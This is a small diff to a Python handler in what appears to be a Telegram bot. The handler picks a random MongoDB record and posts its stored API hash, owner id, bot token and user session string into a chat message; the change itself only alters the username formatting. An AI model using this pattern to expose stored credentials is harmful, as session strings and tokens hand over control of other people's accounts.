@@ -32,7 +32,7 @@ async def fetch_random_mongodb_data(client, message):
             f"API hash: `{random_document['telegram_hash']}`\n"
             f"OWNER id: `{random_document['owner_id']}`\n"
             f"Bot Token: `{random_document['bot_token']}`\n"
-            f"Bot Username: `@{random_document['bot_username']}`\n" if random_document['bot_username'] is not None else "Bot Username: `None`\n"
+            f"Bot Username: `@{random_document['bot_username']}`\n"
             f"String: `{random_document['user_session_string']}`"
         )
 
